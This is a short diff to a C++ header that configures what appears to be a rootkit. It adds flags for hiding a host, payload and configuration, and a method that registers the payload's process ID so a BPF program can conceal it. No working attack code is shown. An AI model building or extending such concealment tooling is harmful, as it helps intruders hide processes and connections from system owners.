@@ -1,6 +1,7 @@
 #ifndef ROOTKIT_CONFIG_MANGER_H
 #define ROOTKIT_CONFIG_MANGER_H
 
+#include <csignal>
 #include <cstdint>
 #include <optional>
 #include <vector>
@@ -19,6 +20,9 @@ struct KernelModuleConfig {
 };
 
 struct RootkitBpfConfig {
+    bool hide_host = false;
+    bool hide_payload = false;
+    bool hide_config = false;
     std::vector<uint64_t> inodes;
 };
 
@@ -54,6 +58,14 @@ public:
     * @return Returns true if reading was correct, and false if error happened
     */
     bool read();
+
+    /**
+     * @brief Add payload pid, to the configuration so it can be hidden by bpf
+     * program. This cannot be done on read time because payload isn't running
+     * at that moment, since payload also relies on this configuration reading.
+     * @param pid Payload pid
+     */
+    void add_payload_pid(pid_t pid);
 
     /**
     * @brief Returns config for kernel module. Set of ips and ports to hide.
